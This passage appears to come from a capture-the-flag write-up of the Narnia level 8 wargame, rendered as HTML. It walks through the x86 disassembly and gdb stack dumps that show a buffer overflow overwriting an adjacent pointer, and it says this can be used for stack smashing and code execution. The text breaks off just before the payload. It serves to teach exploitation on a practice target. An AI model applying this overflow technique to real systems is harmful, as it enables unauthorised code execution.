+ <span class="m">804842</span><span class="n">f</span><span class="o">:</span> <span class="n">e8</span> <span class="n">cc</span> <span class="n">fe</span> <span class="n">ff</span> <span class="n">ff</span>       <span class="n">call</span>   <span class="m">8048300</span> <span class="o">&lt;</span><span class="n">memset</span><span class="o">@</span><span class="n">plt</span><span class="o">&gt;</span>
+ <span class="m">8048434</span><span class="o">:</span> <span class="m">83</span> <span class="n">c4</span> <span class="m">0</span><span class="n">c</span>             <span class="n">add</span>    <span class="n">esp</span><span class="p">,</span><span class="mh">0xc</span>
+ <span class="m">8048437</span><span class="o">:</span> <span class="n">c7</span> <span class="m">05</span> <span class="n">b0</span> <span class="m">97</span> <span class="m">04</span> <span class="m">08</span> <span class="m">00</span> <span class="n">mov</span>    <span class="n">DWORD</span> <span class="n">PTR</span> <span class="n">ds</span><span class="o">:</span><span class="mh">0x80497b0</span><span class="p">,</span><span class="mh">0x0</span>
+ <span class="m">804843</span><span class="n">e</span><span class="o">:</span> <span class="m">00</span> <span class="m">00</span> <span class="m">00</span>
+ <span class="m">8048441</span><span class="o">:</span> <span class="n">eb</span> <span class="m">26</span>                <span class="n">jmp</span>    <span class="m">8048469</span> <span class="o">&lt;</span><span class="n">func</span><span class="m">+0</span><span class="n">x4e</span><span class="o">&gt;</span>
+ <span class="m">8048443</span><span class="o">:</span> <span class="n">a1</span> <span class="n">b0</span> <span class="m">97</span> <span class="m">04</span> <span class="m">08</span>       <span class="n">mov</span>    <span class="n">eax</span><span class="p">,</span><span class="n">ds</span><span class="o">:</span><span class="mh">0x80497b0</span>
+ <span class="m">8048448</span><span class="o">:</span> <span class="m">8</span><span class="n">b</span> <span class="m">15</span> <span class="n">b0</span> <span class="m">97</span> <span class="m">04</span> <span class="m">08</span>    <span class="n">mov</span>    <span class="n">edx</span><span class="p">,</span><span class="n">DWORD</span> <span class="n">PTR</span> <span class="n">ds</span><span class="o">:</span><span class="mh">0x80497b0</span>
+ <span class="m">804844</span><span class="n">e</span><span class="o">:</span> <span class="m">89</span> <span class="n">d1</span>                <span class="n">mov</span>    <span class="n">ecx</span><span class="p">,</span><span class="n">edx</span>
+ <span class="m">8048450</span><span class="o">:</span> <span class="m">8</span><span class="n">b</span> <span class="m">55</span> <span class="n">fc</span>             <span class="n">mov</span>    <span class="n">edx</span><span class="p">,</span><span class="n">DWORD</span> <span class="n">PTR</span> <span class="n">[ebp</span><span class="m">-0</span><span class="n">x4]</span>
+ <span class="m">8048453</span><span class="o">:</span> <span class="m">01</span> <span class="n">ca</span>                <span class="n">add</span>    <span class="n">edx</span><span class="p">,</span><span class="n">ecx</span>
+ <span class="m">8048455</span><span class="o">:</span> <span class="m">0</span><span class="n">f</span> <span class="n">b6</span> <span class="m">12</span>             <span class="n">movzx</span>  <span class="n">edx</span><span class="p">,</span><span class="n">BYTE</span> <span class="n">PTR</span> <span class="n">[edx]</span>
+ <span class="m">8048458</span><span class="o">:</span> <span class="m">88</span> <span class="m">54</span> <span class="m">05</span> <span class="n">e8</span>          <span class="n">mov</span>    <span class="n">BYTE</span> <span class="n">PTR</span> <span class="n">[ebp</span><span class="o">+</span><span class="n">eax</span><span class="o">*</span><span class="m">1-0</span><span class="n">x18]</span><span class="p">,</span><span class="n">dl</span>
+ <span class="m">804845</span><span class="n">c</span><span class="o">:</span> <span class="n">a1</span> <span class="n">b0</span> <span class="m">97</span> <span class="m">04</span> <span class="m">08</span>       <span class="n">mov</span>    <span class="n">eax</span><span class="p">,</span><span class="n">ds</span><span class="o">:</span><span class="mh">0x80497b0</span>
+ <span class="m">8048461</span><span class="o">:</span> <span class="m">83</span> <span class="n">c0</span> <span class="m">01</span>             <span class="n">add</span>    <span class="n">eax</span><span class="p">,</span><span class="mh">0x1</span>
+ <span class="m">8048464</span><span class="o">:</span> <span class="n">a3</span> <span class="n">b0</span> <span class="m">97</span> <span class="m">04</span> <span class="m">08</span>       <span class="n">mov</span>    <span class="n">ds</span><span class="o">:</span><span class="mh">0x80497b0</span><span class="p">,</span><span class="n">eax</span>
+ <span class="m">8048469</span><span class="o">:</span> <span class="n">a1</span> <span class="n">b0</span> <span class="m">97</span> <span class="m">04</span> <span class="m">08</span>       <span class="n">mov</span>    <span class="n">eax</span><span class="p">,</span><span class="n">ds</span><span class="o">:</span><span class="mh">0x80497b0</span>
+ <span class="m">804846</span><span class="n">e</span><span class="o">:</span> <span class="m">89</span> <span class="n">c2</span>                <span class="n">mov</span>    <span class="n">edx</span><span class="p">,</span><span class="n">eax</span>
+ <span class="m">8048470</span><span class="o">:</span> <span class="m">8</span><span class="n">b</span> <span class="m">45</span> <span class="n">fc</span>             <span class="n">mov</span>    <span class="n">eax</span><span class="p">,</span><span class="n">DWORD</span> <span class="n">PTR</span> <span class="n">[ebp</span><span class="m">-0</span><span class="n">x4]</span>
+ <span class="m">8048473</span><span class="o">:</span> <span class="m">01</span> <span class="n">d0</span>                <span class="n">add</span>    <span class="n">eax</span><span class="p">,</span><span class="n">edx</span>
+ <span class="m">8048475</span><span class="o">:</span> <span class="m">0</span><span class="n">f</span> <span class="n">b6</span> <span class="m">00</span>             <span class="n">movzx</span>  <span class="n">eax</span><span class="p">,</span><span class="n">BYTE</span> <span class="n">PTR</span> <span class="n">[eax]</span>
+ <span class="m">8048478</span><span class="o">:</span> <span class="m">84</span> <span class="n">c0</span>                <span class="n">test</span>   <span class="n">al</span><span class="p">,</span><span class="n">al</span>
+ <span class="m">804847</span><span class="n">a</span><span class="o">:</span> <span class="m">75</span> <span class="n">c7</span>                <span class="n">jne</span>    <span class="m">8048443</span> <span class="o">&lt;</span><span class="n">func</span><span class="m">+0</span><span class="n">x28</span><span class="o">&gt;</span>
+ <span class="m">804847</span><span class="n">c</span><span class="o">:</span> <span class="m">8</span><span class="n">d</span> <span class="m">45</span> <span class="n">e8</span>             <span class="n">lea</span>    <span class="n">eax</span><span class="p">,</span><span class="n">[ebp</span><span class="m">-0</span><span class="n">x18]</span>
+ <span class="m">804847</span><span class="n">f</span><span class="o">:</span> <span class="m">50</span>                   <span class="n">push</span>   <span class="n">eax</span>
+ <span class="m">8048480</span><span class="o">:</span> <span class="m">68</span> <span class="m">50</span> <span class="m">85</span> <span class="m">04</span> <span class="m">08</span>       <span class="n">push</span>   <span class="mh">0x8048550</span>
+ <span class="m">8048485</span><span class="o">:</span> <span class="n">e8</span> <span class="m">56</span> <span class="n">fe</span> <span class="n">ff</span> <span class="n">ff</span>       <span class="n">call</span>   <span class="m">80482e0</span> <span class="o">&lt;</span><span class="n">printf</span><span class="o">@</span><span class="n">plt</span><span class="o">&gt;</span>
+ <span class="m">804848</span><span class="n">a</span><span class="o">:</span> <span class="m">83</span> <span class="n">c4</span> <span class="m">08</span>             <span class="n">add</span>    <span class="n">esp</span><span class="p">,</span><span class="mh">0x8</span>
+ <span class="m">804848</span><span class="n">d</span><span class="o">:</span> <span class="m">90</span>                   <span class="n">nop</span>
+ <span class="m">804848</span><span class="n">e</span><span class="o">:</span> <span class="n">c9</span>                   <span class="n">leave</span>  
+ <span class="m">804848</span><span class="n">f</span><span class="o">:</span> <span class="n">c3</span>                   <span class="n">ret</span>
+</code></pre></td></tr></table>
+</div>
+</div><p>First up, allocate <code>0x18 (24)</code> bytes on the stack:</p>
+<div class="highlight"><div class="chroma">
+<table class="lntable"><tr><td class="lntd">
+<pre class="chroma"><code><span class="lnt">1
+</span></code></pre></td>
+<td class="lntd">
+<pre class="chroma"><code class="language-s" data-lang="s"> <span class="m">804841</span><span class="n">e</span><span class="o">:</span> <span class="m">83</span> <span class="n">ec</span> <span class="m">18</span>             <span class="n">sub</span>    <span class="n">esp</span><span class="p">,</span><span class="mh">0x18</span>
+</code></pre></td></tr></table>
+</div>
+</div><p>Load the address of what was passed into the function into <code>$eax</code>:</p>
+<div class="highlight"><div class="chroma">
+<table class="lntable"><tr><td class="lntd">
+<pre class="chroma"><code><span class="lnt">1
+</span></code></pre></td>
+<td class="lntd">
+<pre class="chroma"><code class="language-s" data-lang="s"><span class="m">8048421</span><span class="o">:</span> <span class="m">8</span><span class="n">b</span> <span class="m">45</span> <span class="m">08</span>             <span class="n">mov</span>    <span class="n">eax</span><span class="p">,</span><span class="n">DWORD</span> <span class="n">PTR</span> <span class="n">[ebp</span><span class="m">+0</span><span class="n">x8]</span>
+</code></pre></td></tr></table>
+</div>
+</div><p>Then store that address into a local pointer in the function:</p>
+<div class="highlight"><div class="chroma">
+<table class="lntable"><tr><td class="lntd">
+<pre class="chroma"><code><span class="lnt">1
+</span></code></pre></td>
+<td class="lntd">
+<pre class="chroma"><code class="language-s" data-lang="s"> <span class="m">8048424</span><span class="o">:</span> <span class="m">89</span> <span class="m">45</span> <span class="n">fc</span>             <span class="n">mov</span>    <span class="n">DWORD</span> <span class="n">PTR</span> <span class="n">[ebp</span><span class="m">-0</span><span class="n">x4]</span><span class="p">,</span><span class="n">eax</span>
+</code></pre></td></tr></table>
+</div>
+</div><p>Next up is to setup the <code>memset</code> for the local array:</p>
+<div class="highlight"><div class="chroma">
+<table class="lntable"><tr><td class="lntd">
+<pre class="chroma"><code><span class="lnt">1
+</span><span class="lnt">2
+</span><span class="lnt">3
+</span><span class="lnt">4
+</span><span class="lnt">5
+</span></code></pre></td>
+<td class="lntd">
+<pre class="chroma"><code class="language-s" data-lang="s"> <span class="m">8048427</span><span class="o">:</span> <span class="m">6</span><span class="n">a</span> <span class="m">14</span>                <span class="n">push</span>   <span class="mh">0x14</span>
+ <span class="m">8048429</span><span class="o">:</span> <span class="m">6</span><span class="n">a</span> <span class="m">00</span>                <span class="n">push</span>   <span class="mh">0x0</span>
+ <span class="m">804842</span><span class="n">b</span><span class="o">:</span> <span class="m">8</span><span class="n">d</span> <span class="m">45</span> <span class="n">e8</span>             <span class="n">lea</span>    <span class="n">eax</span><span class="p">,</span><span class="n">[ebp</span><span class="m">-0</span><span class="n">x18]</span>
+ <span class="m">804842</span><span class="n">e</span><span class="o">:</span> <span class="m">50</span>                   <span class="n">push</span>   <span class="n">eax</span>
+ <span class="m">804842</span><span class="n">f</span><span class="o">:</span> <span class="n">e8</span> <span class="n">cc</span> <span class="n">fe</span> <span class="n">ff</span> <span class="n">ff</span>       <span class="n">call</span>   <span class="m">8048300</span> <span class="o">&lt;</span><span class="n">memset</span><span class="o">@</span><span class="n">plt</span><span class="o">&gt;</span>
+</code></pre></td></tr></table>
+</div>
+</div><p>The size of the array is <code>0x14 (20)</code> bytes:</p>
+<div class="highlight"><div class="chroma">
+<table class="lntable"><tr><td class="lntd">
+<pre class="chroma"><code><span class="lnt">1
+</span></code></pre></td>
+<td class="lntd">
+<pre class="chroma"><code class="language-s" data-lang="s"> <span class="m">8048427</span><span class="o">:</span> <span class="m">6</span><span class="n">a</span> <span class="m">14</span>                <span class="n">push</span>   <span class="mh">0x14</span>
+</code></pre></td></tr></table>
+</div>
+</div><p>Which makes sense given that we are using <code>0x4</code> bytes for the pointer and <code>0x14</code> for the array, which matches the <code>0x18</code> that was reserved. Next up another one of those non-obvious at first loops.</p>
+<p>Set the initial value from some globally stored loop counter:</p>
+<div class="highlight"><div class="chroma">
+<table class="lntable"><tr><td class="lntd">
+<pre class="chroma"><code><span class="lnt">1
+</span><span class="lnt">2
+</span></code></pre></td>
+<td class="lntd">
+<pre class="chroma"><code class="language-s" data-lang="s"> <span class="m">8048437</span><span class="o">:</span> <span class="n">c7</span> <span class="m">05</span> <span class="n">b0</span> <span class="m">97</span> <span class="m">04</span> <span class="m">08</span> <span class="m">00</span> <span class="n">mov</span>    <span class="n">DWORD</span> <span class="n">PTR</span> <span class="n">ds</span><span class="o">:</span><span class="mh">0x80497b0</span><span class="p">,</span><span class="mh">0x0</span>
+ <span class="m">804843</span><span class="n">e</span><span class="o">:</span> <span class="m">00</span> <span class="m">00</span> <span class="m">00</span>
+</code></pre></td></tr></table>
+</div>
+</div><p>Jump all the way to where the test will happen:</p>
+<div class="highlight"><div class="chroma">
+<table class="lntable"><tr><td class="lntd">
+<pre class="chroma"><code><span class="lnt">1
+</span><span class="lnt">2
+</span></code></pre></td>
+<td class="lntd">
+<pre class="chroma"><code class="language-s" data-lang="s"> <span class="m">8048441</span><span class="o">:</span> <span class="n">eb</span> <span class="m">26</span>                <span class="n">jmp</span>    <span class="m">8048469</span> <span class="o">&lt;</span><span class="n">func</span><span class="m">+0</span><span class="n">x4e</span><span class="o">&gt;</span>
+…<span class="n">code</span> <span class="n">that</span> <span class="n">will</span> <span class="n">be</span> <span class="n">explored</span> <span class="n">after</span> <span class="n">explaining</span> <span class="n">the</span> <span class="n">loop</span>…
+</code></pre></td></tr></table>
+</div>
+</div><p>Load the contents of the loop counter <code>$edx</code>. Move the address of our local pointer into <code>$eax</code>. Add the address of what we passed in to our loop variable value, given that we know it&rsquo;s <code>argv[1]</code>, it&rsquo;s an array index. <a href="https://c9x.me/x86/html/file_module_x86_id_209.html" target="_blank" rel="noopener noreffer">Move (and zero extend)</a> the newly computed value into <code>$eax</code>. Check the lowest 8 bits (a byte) against themselves. If they aren&rsquo;t equal, then jump into the loop body.</p>
+<div class="highlight"><div class="chroma">
+<table class="lntable"><tr><td class="lntd">
+<pre class="chroma"><code><span class="lnt">1
+</span><span class="lnt">2
+</span><span class="lnt">3
+</span><span class="lnt">4
+</span><span class="lnt">5
+</span><span class="lnt">6
+</span><span class="lnt">7
+</span></code></pre></td>
+<td class="lntd">
+<pre class="chroma"><code class="language-s" data-lang="s"> <span class="m">8048469</span><span class="o">:</span> <span class="n">a1</span> <span class="n">b0</span> <span class="m">97</span> <span class="m">04</span> <span class="m">08</span>       <span class="n">mov</span>    <span class="n">eax</span><span class="p">,</span><span class="n">ds</span><span class="o">:</span><span class="mh">0x80497b0</span>
+ <span class="m">804846</span><span class="n">e</span><span class="o">:</span> <span class="m">89</span> <span class="n">c2</span>                <span class="n">mov</span>    <span class="n">edx</span><span class="p">,</span><span class="n">eax</span>                 <span class="c1"># Loop counter (i)</span>
+ <span class="m">8048470</span><span class="o">:</span> <span class="m">8</span><span class="n">b</span> <span class="m">45</span> <span class="n">fc</span>             <span class="n">mov</span>    <span class="n">eax</span><span class="p">,</span><span class="n">DWORD</span> <span class="n">PTR</span> <span class="n">[ebp</span><span class="m">-0</span><span class="n">x4]</span> <span class="c1"># Addr of argv[1][]</span>
+ <span class="m">8048473</span><span class="o">:</span> <span class="m">01</span> <span class="n">d0</span>                <span class="n">add</span>    <span class="n">eax</span><span class="p">,</span><span class="n">edx</span>                 <span class="c1"># Index into argv[1][i]</span>
+ <span class="m">8048475</span><span class="o">:</span> <span class="m">0</span><span class="n">f</span> <span class="n">b6</span> <span class="m">00</span>             <span class="n">movzx</span>  <span class="n">eax</span><span class="p">,</span><span class="n">BYTE</span> <span class="n">PTR</span> <span class="n">[eax]</span>
+ <span class="m">8048478</span><span class="o">:</span> <span class="m">84</span> <span class="n">c0</span>                <span class="n">test</span>   <span class="n">al</span><span class="p">,</span><span class="n">al</span>                   <span class="c1"># if al == 0 -&gt; ZF = 1</span>
+ <span class="m">804847</span><span class="n">a</span><span class="o">:</span> <span class="m">75</span> <span class="n">c7</span>                <span class="n">jne</span>    <span class="m">8048443</span> <span class="o">&lt;</span><span class="n">func</span><span class="m">+0</span><span class="n">x28</span><span class="o">&gt;</span>     <span class="c1"># if ZF != 1 -&gt; jmp, in other words if argv[1][i] == 0 exit loop</span>
+</code></pre></td></tr></table>
+</div>
+</div><p>Time to breakdown the body of the loop. First up get the value of the loop counter, followed by the value of the local variable. Add local variable and the loop counter, given that we know the local variable is just a pointer to <code>argv[1]</code> it&rsquo;s just indexing into that char array. After that, store the address of the result into <code>$edx</code> with zero extending. Store the result of the lower 8bits (aka byte) into the loop index of the local array, aka <code>array[i]</code>. Finally increment the loop counter and start the loop condition checking all over:</p>
+<div class="highlight"><div class="chroma">
+<table class="lntable"><tr><td class="lntd">
+<pre class="chroma"><code><span class="lnt"> 1
+</span><span class="lnt"> 2
+</span><span class="lnt"> 3
+</span><span class="lnt"> 4
+</span><span class="lnt"> 5
+</span><span class="lnt"> 6
+</span><span class="lnt"> 7
+</span><span class="lnt"> 8
+</span><span class="lnt"> 9
+</span><span class="lnt">10
+</span></code></pre></td>
+<td class="lntd">
+<pre class="chroma"><code class="language-s" data-lang="s"> <span class="m">8048443</span><span class="o">:</span> <span class="n">a1</span> <span class="n">b0</span> <span class="m">97</span> <span class="m">04</span> <span class="m">08</span>       <span class="n">mov</span>    <span class="n">eax</span><span class="p">,</span><span class="n">ds</span><span class="o">:</span><span class="mh">0x80497b0</span>              <span class="c1"># Loop counter from data segment</span>
+ <span class="m">8048448</span><span class="o">:</span> <span class="m">8</span><span class="n">b</span> <span class="m">15</span> <span class="n">b0</span> <span class="m">97</span> <span class="m">04</span> <span class="m">08</span>    <span class="n">mov</span>    <span class="n">edx</span><span class="p">,</span><span class="n">DWORD</span> <span class="n">PTR</span> <span class="n">ds</span><span class="o">:</span><span class="mh">0x80497b0</span>    <span class="c1"># Loop counter from data segment</span>
+ <span class="m">804844</span><span class="n">e</span><span class="o">:</span> <span class="m">89</span> <span class="n">d1</span>                <span class="n">mov</span>    <span class="n">ecx</span><span class="p">,</span><span class="n">edx</span>
+ <span class="m">8048450</span><span class="o">:</span> <span class="m">8</span><span class="n">b</span> <span class="m">55</span> <span class="n">fc</span>             <span class="n">mov</span>    <span class="n">edx</span><span class="p">,</span><span class="n">DWORD</span> <span class="n">PTR</span> <span class="n">[ebp</span><span class="m">-0</span><span class="n">x4]</span>       <span class="c1"># argv[1]</span>
+ <span class="m">8048453</span><span class="o">:</span> <span class="m">01</span> <span class="n">ca</span>                <span class="n">add</span>    <span class="n">edx</span><span class="p">,</span><span class="n">ecx</span>
+ <span class="m">8048455</span><span class="o">:</span> <span class="m">0</span><span class="n">f</span> <span class="n">b6</span> <span class="m">12</span>             <span class="n">movzx</span>  <span class="n">edx</span><span class="p">,</span><span class="n">BYTE</span> <span class="n">PTR</span> <span class="n">[edx]</span>            <span class="c1"># argv[1][i]</span>
+ <span class="m">8048458</span><span class="o">:</span> <span class="m">88</span> <span class="m">54</span> <span class="m">05</span> <span class="n">e8</span>          <span class="n">mov</span>    <span class="n">BYTE</span> <span class="n">PTR</span> <span class="n">[ebp</span><span class="o">+</span><span class="n">eax</span><span class="o">*</span><span class="m">1-0</span><span class="n">x18]</span><span class="p">,</span><span class="n">dl</span>  <span class="c1"># [ebp-0x18] is the start of local array[], eax*1 is [i]</span>
+ <span class="m">804845</span><span class="n">c</span><span class="o">:</span> <span class="n">a1</span> <span class="n">b0</span> <span class="m">97</span> <span class="m">04</span> <span class="m">08</span>       <span class="n">mov</span>    <span class="n">eax</span><span class="p">,</span><span class="n">ds</span><span class="o">:</span><span class="mh">0x80497b0</span>
+ <span class="m">8048461</span><span class="o">:</span> <span class="m">83</span> <span class="n">c0</span> <span class="m">01</span>             <span class="n">add</span>    <span class="n">eax</span><span class="p">,</span><span class="mh">0x1</span>                       <span class="c1"># increment loop counter</span>
+ <span class="m">8048464</span><span class="o">:</span> <span class="n">a3</span> <span class="n">b0</span> <span class="m">97</span> <span class="m">04</span> <span class="m">08</span>       <span class="n">mov</span>    <span class="n">ds</span><span class="o">:</span><span class="mh">0x80497b0</span><span class="p">,</span><span class="n">eax</span>
+</code></pre></td></tr></table>
+</div>
+</div><p>Lastly print out the contents of the local array:</p>
+<div class="highlight"><div class="chroma">
+<table class="lntable"><tr><td class="lntd">
+<pre class="chroma"><code><span class="lnt">1
+</span><span class="lnt">2
+</span><span class="lnt">3
+</span><span class="lnt">4
+</span></code></pre></td>
+<td class="lntd">
+<pre class="chroma"><code class="language-s" data-lang="s"> <span class="m">804847</span><span class="n">c</span><span class="o">:</span> <span class="m">8</span><span class="n">d</span> <span class="m">45</span> <span class="n">e8</span>             <span class="n">lea</span>    <span class="n">eax</span><span class="p">,</span><span class="n">[ebp</span><span class="m">-0</span><span class="n">x18]</span>
+ <span class="m">804847</span><span class="n">f</span><span class="o">:</span> <span class="m">50</span>                   <span class="n">push</span>   <span class="n">eax</span>
+ <span class="m">8048480</span><span class="o">:</span> <span class="m">68</span> <span class="m">50</span> <span class="m">85</span> <span class="m">04</span> <span class="m">08</span>       <span class="n">push</span>   <span class="mh">0x8048550</span>
+ <span class="m">8048485</span><span class="o">:</span> <span class="n">e8</span> <span class="m">56</span> <span class="n">fe</span> <span class="n">ff</span> <span class="n">ff</span>       <span class="n">call</span>   <span class="m">80482e0</span> <span class="o">&lt;</span><span class="n">printf</span><span class="o">@</span><span class="n">plt</span><span class="o">&gt;</span>
+</code></pre></td></tr></table>
+</div>
+</div><p>Thinking through what the breakdown, the pseudo &ldquo;C&rdquo; code for the whole function would likely look something like this:</p>
+<div class="highlight"><div class="chroma">
+<table class="lntable"><tr><td class="lntd">
+<pre class="chroma"><code><span class="lnt"> 1
+</span><span class="lnt"> 2
+</span><span class="lnt"> 3
+</span><span class="lnt"> 4
+</span><span class="lnt"> 5
+</span><span class="lnt"> 6
+</span><span class="lnt"> 7
+</span><span class="lnt"> 8
+</span><span class="lnt"> 9
+</span><span class="lnt">10
+</span></code></pre></td>
+<td class="lntd">
+<pre class="chroma"><code class="language-c" data-lang="c"><span class="kt">void</span> <span class="nf">func</span><span class="p">(</span><span class="kt">char</span><span class="o">*</span> <span class="n">argv</span><span class="p">)</span> <span class="p">{</span>
+    <span class="kt">char</span><span class="o">*</span> <span class="n">ptr</span><span class="p">;</span>
+    <span class="kt">char</span> <span class="n">array</span><span class="p">[</span><span class="mi">20</span><span class="p">];</span>
+    <span class="n">ptr</span> <span class="o">=</span> <span class="n">argv</span><span class="p">;</span>
+    <span class="n">memset</span><span class="p">(</span><span class="n">array</span><span class="p">,</span> <span class="mh">0x0</span><span class="p">,</span> <span class="mh">0x20</span><span class="p">);</span>
+    <span class="k">for</span> <span class="p">(</span><span class="n">i</span> <span class="o">=</span> <span class="mi">0</span><span class="p">;</span> <span class="n">ptr</span><span class="p">[</span><span class="n">i</span><span class="p">]</span> <span class="o">!=</span> <span class="mi">0</span><span class="p">;</span> <span class="n">i</span><span class="o">++</span><span class="p">)</span> <span class="p">{</span>
+        <span class="n">array</span><span class="p">[</span><span class="n">i</span><span class="p">]</span> <span class="o">=</span>  <span class="n">ptr</span><span class="p">[</span><span class="n">i</span><span class="p">];</span>
+    <span class="p">}</span>
+    <span class="n">printf</span><span class="p">(</span><span class="s">&#34;%s</span><span class="se">\n</span><span class="s">&#34;</span><span class="p">,</span> <span class="n">array</span><span class="p">);</span>
+<span class="p">}</span>
+</code></pre></td></tr></table>
+</div>
+</div><p>The important thing here is that the loop variable is not defined within the function itself nor within the loop. Instead the loop counter is actually part of the <a href="https://en.wikipedia.org/wiki/Data_segment" target="_blank" rel="noopener noreffer">Data Segment</a>. The other thing to note is that the loop will continue until it gets a terminator character in the array. Finally, the stack is laid out is interesting. If we dump the stack right after the <code>memset</code>:</p>
+<div class="highlight"><div class="chroma">
+<table class="lntable"><tr><td class="lntd">
+<pre class="chroma"><code><span class="lnt"> 1
+</span><span class="lnt"> 2
+</span><span class="lnt"> 3
+</span><span class="lnt"> 4
+</span><span class="lnt"> 5
+</span><span class="lnt"> 6
+</span><span class="lnt"> 7
+</span><span class="lnt"> 8
+</span><span class="lnt"> 9
+</span><span class="lnt">10
+</span></code></pre></td>
+<td class="lntd">
+<pre class="chroma"><code class="language-s" data-lang="s"><span class="p">(</span><span class="n">gdb</span><span class="p">)</span> <span class="n">b</span> <span class="o">*</span><span class="m">8048434</span>
+<span class="p">(</span><span class="n">gdb</span><span class="p">)</span> <span class="n">r</span> <span class="n">`python -c &#39;print &#34;A&#34;*32&#39;`</span>
+<span class="n">The</span> <span class="n">program</span> <span class="n">being</span> <span class="n">debugged</span> <span class="n">has</span> <span class="n">been</span> <span class="n">started</span> <span class="n">already.</span>
+<span class="n">Start</span> <span class="n">it</span> <span class="n">from</span> <span class="n">the</span> <span class="n">beginning</span><span class="o">?</span> <span class="p">(</span><span class="n">y</span> <span class="n">or</span> <span class="n">n</span><span class="p">)</span> <span class="n">y</span>
+<span class="n">Starting</span> <span class="n">program</span><span class="o">:</span> <span class="o">/</span><span class="n">narnia</span><span class="o">/</span><span class="n">narnia8</span> <span class="nf">`python -c &#39;print &#34;A&#34;*32&#39;`
+</span><span class="nf">
+</span><span class="nf"></span><span class="p">(</span><span class="n">gdb</span><span class="p">)</span> <span class="n">x</span><span class="o">/</span><span class="m">40</span><span class="n">xw</span> <span class="o">$</span><span class="n">esp</span>
+<span class="mh">0xffffd684</span><span class="o">:</span> <span class="mh">0x00000000</span> <span class="mh">0x00000000</span> <span class="mh">0x00000000</span> <span class="mh">0x00000000</span>
+<span class="mh">0xffffd694</span><span class="o">:</span> <span class="mh">0x00000000</span> <span class="mh">0xffffd886</span> <span class="mh">0xffffd6a8</span> <span class="mh">0x080484a7</span>
+<span class="mh">0xffffd6a4</span><span class="o">:</span> <span class="mh">0xffffd886</span> <span class="mh">0x00000000</span> <span class="mh">0xf7e2a286</span> <span class="mh">0x00000002</span>
+</code></pre></td></tr></table>
+</div>
+</div><p>We can see that the local buffer, (<code>0xffffd684: &lt;0x00000000 * 5&gt;</code>) and the pointer to <code>argv[1]</code> (<code>0xffffd698: 0xffffd886</code>) are adjacent to each other:</p>
+<div class="highlight"><div class="chroma">
+<table class="lntable"><tr><td class="lntd">
+<pre class="chroma"><code><span class="lnt">1
+</span><span class="lnt">2
+</span></code></pre></td>
+<td class="lntd">
+<pre class="chroma"><code class="language-s" data-lang="s"><span class="p">(</span><span class="n">gdb</span><span class="p">)</span> <span class="n">x</span><span class="o">/</span><span class="n">s</span> <span class="mh">0xffffd886</span>
+<span class="mh">0xffffd886</span><span class="o">:</span> <span class="s">&#39;A&#39;</span> <span class="o">&lt;</span><span class="n">repeats</span> <span class="m">32</span> <span class="n">times</span><span class="o">&gt;</span>
+</code></pre></td></tr></table>
+</div>
+</div><p>Each time through the loop the address at the local pointer is dereferenced and the data at that location is copied to the local buffer (<code>array[]</code>). When the copy overflows past the size of the local buffer it will actually change the address pointed to by the local pointer (<code>ptr</code>). The next iteration through the loop then dereferences the new overwritten address being pointed to by the local pointer and tries to compare and copy that data.</p>
+<div class="highlight"><div class="chroma">
+<table class="lntable"><tr><td class="lntd">
+<pre class="chroma"><code><span class="lnt"> 1
+</span><span class="lnt"> 2
+</span><span class="lnt"> 3
+</span><span class="lnt"> 4
+</span><span class="lnt"> 5
+</span><span class="lnt"> 6
+</span><span class="lnt"> 7
+</span><span class="lnt"> 8
+</span><span class="lnt"> 9
+</span><span class="lnt">10
+</span><span class="lnt">11
+</span><span class="lnt">12
+</span></code></pre></td>
+<td class="lntd">
+<pre class="chroma"><code class="language-s" data-lang="s"><span class="p">(</span><span class="n">gdb</span><span class="p">)</span> <span class="n">x</span><span class="o">/</span><span class="m">40</span><span class="n">xw</span> <span class="o">$</span><span class="n">esp</span>
+<span class="mh">0xffffd684</span><span class="o">:</span> <span class="mh">0x00000000</span> <span class="mh">0x00000000</span> <span class="mh">0x00000000</span> <span class="mh">0x00000000</span> <span class="c1"># Before any copies</span>
+<span class="mh">0xffffd694</span><span class="o">:</span> <span class="mh">0x00000000</span> <span class="mh">0xffffd886</span> <span class="mh">0xffffd6a8</span> <span class="mh">0x080484a7</span> <span class="c1"># Note that ptr is 0xffffd886</span>
+<span class="n">...and</span> <span class="n">running</span> <span class="n">through</span> <span class="n">to</span> <span class="n">fill</span> <span class="n">up</span> <span class="n">the</span> <span class="n">buffer</span> <span class="n">and</span> <span class="n">overflow</span> <span class="nf">once...
+</span><span class="nf"></span><span class="p">(</span><span class="n">gdb</span><span class="p">)</span> <span class="n">x</span><span class="o">/</span><span class="m">40</span><span class="n">xw</span> <span class="o">$</span><span class="n">esp</span>
+<span class="mh">0xffffd674</span><span class="o">:</span> <span class="mh">0x41414141</span> <span class="mh">0x41414141</span> <span class="mh">0x41414141</span> <span class="mh">0x41414141</span> <span class="c1"># Note that the &#34;A&#34;s have filled up the buffer</span>
+<span class="mh">0xffffd684</span><span class="o">:</span> <span class="mh">0x41414141</span> <span class="mh">0xffffd841</span> <span class="mh">0xffffd698</span> <span class="mh">0x080484a7</span> <span class="c1"># Notice that ptr is now 0xffffd841</span>
+<span class="n">..continue</span> <span class="n">execution</span> <span class="n">one</span> <span class="n">more</span> <span class="nf">time...
+</span><span class="nf"></span><span class="p">(</span><span class="n">gdb</span><span class="p">)</span> <span class="n">x</span><span class="o">/</span><span class="m">40</span><span class="n">xw</span> <span class="o">$</span><span class="n">esp</span>
+<span class="mh">0xffffd674</span><span class="o">:</span> <span class="mh">0x41414141</span> <span class="mh">0x41414141</span> <span class="mh">0x41414141</span> <span class="mh">0x41414141</span> <span class="c1"># Loop copies all of the &#34;A&#34; to the buffer</span>
+<span class="mh">0xffffd684</span><span class="o">:</span> <span class="mh">0x41414141</span> <span class="mh">0xffff0641</span> <span class="mh">0xffffd698</span> <span class="mh">0x080484a7</span> <span class="c1"># Loop continues to copy the contents of &#34;A&#34; to</span>
+                                                        <span class="c1"># the buffer and then overflows changing addr of the ptr</span>
+</code></pre></td></tr></table>
+</div>
+</div><p>Knowing that we can control the overflow, it should be possible to use this to exploit the program. One of the biggest challenges is to maintain the value of <code>ptr</code> to ensure that it doesn&rsquo;t get changed and always points to our input data. Accomplishing this should allow for smashing the stack and executing and code desired.</p>
+<p>With that in mind the payload necessary to accomplish this looks like:</p>
+<div class="highlight"><div class="chroma">
+<table class="lntable"><tr><td class="lntd">
+<pre class="chroma"><code><span class="lnt">1
+</span></code></pre></td>
+<td class="lntd">
